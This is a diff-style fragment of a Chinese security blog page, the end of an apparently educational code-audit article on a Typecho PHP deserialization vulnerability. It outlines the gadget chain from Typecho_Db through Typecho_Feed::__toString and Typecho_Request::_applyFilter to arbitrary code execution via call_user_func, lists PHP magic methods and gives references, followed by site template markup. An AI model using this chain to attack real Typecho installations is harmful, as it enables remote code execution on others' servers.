+<p><code>Typecho_Db</code>类构造函数 –&gt; <code>Typecho_Feed</code>类的<code>__toString()</code>魔术方法 –&gt; <code>Typecho_Request</code>类的<code>__get()</code>魔术方法 –&gt; <code>Typecho_Request</code>类的<code>get()</code>方法 –&gt;<br><code>Typecho_Request</code>类的<code>_applyFilter()</code>方法 –&gt;<br><code>call_user_func()</code>执行任意代码</p>
+<h2 id="0x03-PHP魔术方法"><a href="#0x03-PHP魔术方法" class="headerlink" title="0x03 PHP魔术方法"></a>0x03 PHP魔术方法</h2><ul>
+<li><code>__construct()</code>，类的构造函数</li>
+<li><code>__destruct()</code>，类的析构函数</li>
+<li><code>__call()</code>，在对象中调用一个不可访问方法时调用</li>
+<li><code>__callStatic()</code>，用静态方式中调用一个不可访问方法时调用</li>
+<li><code>__get()</code>，获得一个类的成员变量时调用</li>
+<li><code>__set()</code>，设置一个类的成员变量时调用</li>
+<li><code>__isset()</code>，当对不可访问属性调用isset()或empty()时调用</li>
+<li><code>__unset()</code>，当对不可访问属性调用unset()时被调用。</li>
+<li><code>__sleep()</code>，执行serialize()时，先会调用这个函数</li>
+<li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数</li>
+<li><code>__toString()</code>，类被当成字符串时的回应方法</li>
+<li><code>__invoke()</code>，调用函数的方式调用一个对象时的回应方法</li>
+<li><code>__set_state()</code>，调用var_export()导出类时，此静态方法会被调用。</li>
+<li><code>__clone()</code>，当对象复制完成时调用</li>
+</ul>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/424/">https://paper.seebug.org/424/</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.th1s.cn/index.php/2017/10/25/138.html">http://www.th1s.cn/index.php/2017/10/25/138.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://joyqi.com/typecho/about-typecho-20171027.html?from=timeline&amp;isappinstalled=0">https://joyqi.com/typecho/about-typecho-20171027.html?from=timeline&amp;isappinstalled=0</a></li>
+<li><a target="_blank" rel="noopener" href="http://p0sec.net/index.php/archives/114/">http://p0sec.net/index.php/archives/114/</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/12/26/SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSH正向代理与反向代理</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/11/21/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWriteup/">
+                        <span class="hidden-mobile">第六届山东省大学生网络安全技能大赛决赛Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
